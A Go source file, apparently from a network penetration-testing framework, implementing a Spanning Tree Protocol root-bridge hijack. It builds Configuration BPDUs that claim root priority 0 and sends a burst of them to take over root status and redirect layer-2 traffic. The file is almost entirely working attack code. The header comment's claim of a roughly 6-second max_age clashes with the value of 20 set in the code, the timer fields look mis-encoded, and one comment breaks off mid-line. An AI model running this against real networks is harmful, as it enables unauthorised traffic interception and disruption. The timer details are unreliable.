// stproot.go implements the STP root-bridge hijack attack. It sends superior
// BPDUs (root priority 0, lower than the default 32768) to become the root
// bridge, causing traffic redirection. Classified transient-decay: the
// engineered max_age is ~6s, after which the real root resumes.
//
// This is a flood-class behavior: it uses the sync.Pool craft path (KTD5)
// for pre-serialized BPDU buffers, since the attack sends repeated BPDUs
// at a rate the default allocation path cannot sustain.

package l2

import (
	"context"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"net"
	"time"

	"github.com/gopacket/gopacket"
	"github.com/gopacket/gopacket/layers"

	"go.aledante.io/FlowSeer/src/netpen/runner"
)

type stpRootFinding struct {
	Action       string `json:"action"`
	RootPriority uint16 `json:"root_priority"`
	MaxAge       uint16 `json:"max_age"`
	BurstCount   int    `json:"burst_count"`
}

// RunSTPRoot sends superior BPDUs to claim STP root. The burst count is
// bounded by the rate and a short duration; the behavior is transient-decay.
func RunSTPRoot(ctx context.Context, deps runner.Deps) error {
	src := srcMAC(deps)

	rootPriority := uint16(0)
	maxAge := uint16(20)
	helloTime := uint16(6)
	forwardDelay := uint16(2)
	msgAge := uint16(15)

	// Pre-serialize the BPDU once; the flood path sends it repeatedly
	// from the pooled buffer (KTD5).
	bpduPkt, err := craftSTPBPDU(src, rootPriority, maxAge, helloTime, forwardDelay, msgAge)
	if err != nil {
		return fmt.Errorf("stproot: craft BPDU: %w", err)
	}

	// Send a bounded burst of BPDUs. The baseline sends continuously;
	// the behavior sends a fixed number for the in-memory test shape.
	burstCount := 3
	for i := 0; i < burstCount; i++ {
		if err := deps.AttackLeg.Send(ctx, bpduPkt); err != nil {
			return fmt.Errorf("stproot: send BPDU %d: %w", i, err)
		}
		// Honor rate if set; otherwise no delay.
		if deps.Rate > 0 {
			select {
			case <-ctx.Done():
				return ctx.Err()
			case <-time.After(time.Second / time.Duration(deps.Rate)):
			}
		}
	}

	detail, _ := json.Marshal(stpRootFinding{
		Action:       "claim-root",
		RootPriority: rootPriority,
		MaxAge:       maxAge,
		BurstCount:   burstCount,
	})
	deps.Emitter.Finding("stp", detail)

	return nil
}

// craftSTPBPDU builds a Configuration BPDU: Ethernet → LLC(0x42/0x42/0x03) →
func craftSTPBPDU(src net.HardwareAddr, rootPriority, maxAge, helloTime, forwardDelay, msgAge uint16) ([]byte, error) {
	eth := &layers.Ethernet{
		DstMAC:       stpDstMAC,
		SrcMAC:       src,
		EthernetType: layers.EthernetTypeLLC,
	}
	llc := &layers.LLC{
		DSAP:    0x42,
		SSAP:    0x42,
		Control: 3,
	}
	stp := buildSTPPayload(rootPriority, src, maxAge, helloTime, forwardDelay, msgAge)
	return craftDefault(eth, llc, gopacket.Payload(stp))
}

// buildSTPPayload builds the STP Configuration BPDU body.
func buildSTPPayload(rootPriority uint16, bridgeMAC net.HardwareAddr, maxAge, helloTime, forwardDelay, msgAge uint16) []byte {
	out := make([]byte, 0, 35)
	// Protocol ID = 0.
	out = append(out, 0x00, 0x00)
	// Version = 0.
	out = append(out, 0x00)
	// BPDU type = 0x00 (Configuration).
	out = append(out, 0x00)
	// Flags = 0x00.
	out = append(out, 0x00)
	// Root ID: priority + MAC.
	rootID := make([]byte, 8)
	binary.BigEndian.PutUint16(rootID[0:2], rootPriority)
	copy(rootID[2:8], bridgeMAC)
	out = append(out, rootID...)
	// Root path cost = 0.
	out = append(out, 0x00, 0x00, 0x00, 0x00)
	// Bridge ID: same as root (we are the root).
	bridgeID := make([]byte, 8)
	binary.BigEndian.PutUint16(bridgeID[0:2], rootPriority)
	copy(bridgeID[2:8], bridgeMAC)
	out = append(out, bridgeID...)
	// Port ID = 0x8001.
	portID := make([]byte, 2)
	binary.BigEndian.PutUint16(portID, 0x8001)
	out = append(out, portID...)
	// Message age.
	ma := make([]byte, 2)
	binary.BigEndian.PutUint16(ma, msgAge)
	out = append(out, ma...)
	// Max age.
	mav := make([]byte, 2)
	binary.BigEndian.PutUint16(mav, maxAge)
	out = append(out, mav...)
	// Hello time.
	ht := make([]byte, 2)
	binary.BigEndian.PutUint16(ht, helloTime)
	out = append(out, ht...)
	// Forward delay.
	fd := make([]byte, 2)
	binary.BigEndian.PutUint16(fd, forwardDelay)
	out = append(out, fd...)
	return out
}
